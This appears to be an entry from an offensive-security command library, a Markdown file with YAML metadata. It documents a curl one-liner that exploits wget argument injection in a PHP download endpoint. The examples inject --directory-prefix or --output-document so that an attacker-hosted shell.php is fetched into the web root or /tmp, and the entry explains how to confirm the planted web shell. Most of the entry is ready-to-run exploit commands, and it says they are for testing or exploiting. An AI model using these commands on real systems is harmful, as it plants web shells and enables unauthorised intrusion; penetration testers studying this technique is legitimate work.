---
type: command
executor: bash
data: >-
  curl
  "$_TARGET_URL?url=%2D%2Ddirectory%2Dprefix%3D%2Fvar%2Fwww%2Fhtml%20$_PAYLOAD_URL"
output: null
tags:
  - injection
  - test
  - curl
platforms:
  - Linux
  - Web
verified: true
validated: true
---

# curl-send-wget-injection-payload

## Command

```bash
curl "$_TARGET_URL?url=%2D%2Ddirectory%2Dprefix%3D%2Fvar%2Fwww%2Fhtml%20$_PAYLOAD_URL"
```

## Description

This command sends an HTTP GET request to a vulnerable download endpoint, injecting a wget --directory-prefix option via the 'url' parameter to redirect the downloaded file to /var/www/html. Use for testing or exploiting WGET argument injection in PHP-based web apps. For normal testing, replace the injected payload with a benign URL like http://example.com/test.txt.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Full URL of the vulnerable endpoint (e.g., http://target.com/download) | Yes |
| $_PAYLOAD_URL | Attacker-controlled URL hosting the malicious file (e.g., http://yourserver.com/shell.php) | Yes |

## Examples

### Basic Usage (Injection Test)

```bash
curl "http://target.com/download?url=%2D%2Ddirectory%2Dprefix%3D%2Fvar%2Fwww%2Fhtml%20http://yourserver.com/shell.php"
```

### Normal Download Test (Non-Injection)

```bash
curl "http://target.com/download?url=http://example.com/test.txt"
```

### Advanced Usage (Alternative Directory)

```bash
curl "http://target.com/download?url=%2D%2Doutput%2Ddocument%3D%2Ftmp%2Fshell.php%20http://yourserver.com/shell.php"
```

## Expected Output

A successful response might be plain text like "File downloaded successfully" or HTTP 200 OK. Errors could include 400 Bad Request if input is filtered. Verify by accessing http://target.com/shell.php (for web root writes) or checking server logs/files.

## Related

- [[procedures/WGET-Argument-Injection]]
- [[curl-normal-download-test]] (for baseline testing)
